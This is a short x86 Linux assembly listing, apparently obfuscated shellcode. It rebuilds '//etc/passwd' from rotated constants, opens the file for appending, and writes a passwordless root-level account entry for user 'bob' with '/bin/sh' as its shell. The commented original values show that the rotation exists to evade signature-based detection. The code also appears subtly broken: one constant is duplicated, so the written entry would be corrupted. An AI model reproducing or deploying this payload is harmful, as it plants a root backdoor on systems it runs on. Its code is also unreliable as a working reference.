section .text
	global _start

_start: 
	xor    eax,eax
;xor    ebx,ebx
;xor    ecx,ecx
	mov eax,ecx
;push   ebx
	push   eax

;push   0x64777373
	mov ebx, 0xC8EEE6E6
	ror ebx, 1
	mov dword [esp-4], ebx
	sub esp,4

;push   0x61702f63
	mov ebx, 0xC2E05EC6
	ror ebx, 1
	push ebx

;push   0x74652f2f
	mov ebx, 0xE8CA5E5E
	ror ebx, 1
	push ebx

	mov    ebx,esp
	mov    cx,0x401
	mov    al,0x5
	int    0x80
	mov    ebx,eax
;xor    eax,eax
	xor    edx,edx

;push   0x68732f6e
	mov ecx, 0xD0E65EDC
	ror ecx, 1
	push ecx

;push   0x69622f2f
        mov ecx, 0xD0E65EDC
        ror ecx, 1
        push ecx

;push   0x3a2f3a3a
        mov ecx, 0x745E7474
        ror ecx, 1
        push ecx

;push   0x303a303a
        mov ecx, 0x60746074
        ror ecx, 1
        push ecx

;push   0x3a626f62
        mov ecx, 0x74C4DEC4
        ror ecx, 1
        push ecx

	mov    ecx,esp
	mov    dl,0x14
	mov    al,0x4
	int    0x80
;xor    eax,eax
	mov    al,0x6
	int    0x80
;xor    eax,eax
	mov    al,0x1
	int    0x80
